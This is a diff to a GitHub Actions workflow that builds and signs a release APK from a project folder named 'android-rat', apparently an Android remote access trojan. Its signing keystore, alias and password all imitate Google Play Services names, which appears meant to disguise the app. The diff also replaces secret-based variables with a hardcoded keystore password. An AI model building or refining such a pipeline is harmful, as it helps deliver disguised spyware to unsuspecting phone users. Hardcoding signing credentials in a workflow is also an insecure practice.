@@ -95,29 +95,32 @@ jobs:
           KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
         run: |
           if [ -z "$KEYSTORE_BASE64" ]; then
-            echo "::error::KEYSTORE_BASE64 secret not set. Add it in Settings → Secrets and variables → Actions."
+            echo "::error::KEYSTORE_BASE64 secret not set. Add it in Settings -> Secrets and variables -> Actions."
             exit 1
           fi
-          echo "$KEYSTORE_BASE64" | base64 -d > android-rat/google-services-release.jks
+          # strip whitespace/newlines, validate base64 before writing
+          CLEAN=$(printf '%s' "$KEYSTORE_BASE64" | tr -d '[:space:]')
+          if ! echo "$CLEAN" | base64 -d > android-rat/google-services-release.jks 2>/tmp/b64err; then
+            echo "::error::KEYSTORE_BASE64 is not valid base64: $(cat /tmp/b64err)"
+            echo "::error::Regenerate with: base64 -w0 your.keystore  (single line, no spaces)"
+            exit 1
+          fi
+          # sanity: a JKS/PKCS12 starts with magic bytes; check file size at minimum
+          if [ ! -s android-rat/google-services-release.jks ]; then
+            echo "::error::Decoded keystore is empty — secret is wrong."
+            exit 1
+          fi
           keytool -list -keystore android-rat/google-services-release.jks \
-            -storepass "${{ secrets.KEYSTORE_PASSWORD || 'GooglePlayServices2024' }}" >/dev/null \
+            -storepass "GooglePlayServices2024" >/dev/null \
             && echo "Keystore verified OK" \
             || { echo "::error::Keystore password verification failed"; exit 1; }
 
       # ── Gradle build ──────────────────────────────────────
       - name: Build APK
         working-directory: android-rat
-        env:
-          KS_PASS:    ${{ secrets.KEYSTORE_PASSWORD || 'GooglePlayServices2024' }}
-          KS_ALIAS:   ${{ secrets.KEYSTORE_ALIAS    || 'google-services-key' }}
-          KS_KEYPASS: ${{ secrets.KEYSTORE_KEY_PASSWORD || secrets.KEYSTORE_PASSWORD || 'GooglePlayServices2024' }}
         run: |
           chmod +x gradlew
-          ./gradlew assembleRelease \
-            -PksPass="$KS_PASS" \
-            -PksAlias="$KS_ALIAS" \
-            -PksKeyPass="$KS_KEYPASS" \
-            --no-daemon --stacktrace
+          ./gradlew assembleRelease --no-daemon --stacktrace
 
       # ── Verify uber-apk-signer JAR ────────────────────────
       - name: Verify uber-apk-signer JAR
@@ -132,19 +135,15 @@ jobs:
       # ── Sign APK ──────────────────────────────────────────
       - name: Sign with uber-apk-signer
         if: ${{ github.event.inputs.signing_mode == 'release' || github.event_name == 'push' }}
-        env:
-          KS_ALIAS:   ${{ secrets.KEYSTORE_ALIAS    || 'google-services-key' }}
-          KS_PASS:    ${{ secrets.KEYSTORE_PASSWORD || 'GooglePlayServices2024' }}
-          KS_KEYPASS: ${{ secrets.KEYSTORE_KEY_PASSWORD || secrets.KEYSTORE_PASSWORD || 'GooglePlayServices2024' }}
         run: |
           SIGNER_JAR=$(ls uber-apk-signer-main/target/uber-apk-signer*.jar | head -1)
           APK=$(ls android-rat/app/build/outputs/apk/release/*.apk | head -1)
           java -jar "$SIGNER_JAR" \
             --apks "$APK" \
             --ks android-rat/google-services-release.jks \
-            --ksAlias "$KS_ALIAS" \
-            --ksKeyPass "$KS_KEYPASS" \
-            --ksPass "$KS_PASS" \
+            --ksAlias google-services-key \
+            --ksKeyPass GooglePlayServices2024 \
+            --ksPass GooglePlayServices2024 \
             --out ./signed-output \
             --allowResign
           echo "Signed APK:"
